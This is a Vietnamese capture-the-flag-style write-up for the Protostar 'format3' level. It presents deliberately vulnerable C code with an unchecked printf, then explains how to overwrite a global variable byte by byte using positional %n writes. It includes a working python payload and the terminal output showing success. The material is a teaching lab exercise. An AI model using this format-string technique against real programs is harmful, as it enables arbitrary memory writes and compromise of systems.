# **format3**
## Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

## Vulnerability
printf()

## Exploit
- Tìm địa chỉ target: 0x080496f4
- Sử dụng %...$n để %n đến vị trí trong stack cụ thể, không cần dùng nhiều %x như các bài trước.
- Ta cần sửa target thành 0x01025544, không thể tạo ra string rác dài 0x01025544 => chia từng cục để chỉnh sửa.
  - 0x080496f4: 0x44
  - 0x080496f5: 0x55
  - 0x080496f6: 0x102
=> attack-string:
```
python -c 'print "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "%56x%12$n" + "%17x%13$n" + "%173x%14$n"'
```
- Trong đó: 
  - 0x44 = 12+56
  - 0x55 = 12+56+17
  - 0x102 = 12+56+17+173
- Kết quả:
```
user@protostar:/opt/protostar/bin$ python -c 'print "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "%56x%12$n" + "%17x%13$n" + "%173x%14$n"' | ./format3
��                                                       0         bffff5c0                                                                                                                                                                     b7fd7ff4
you have modified the target :)
```
# References
- Format String exploitation tutorial: https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf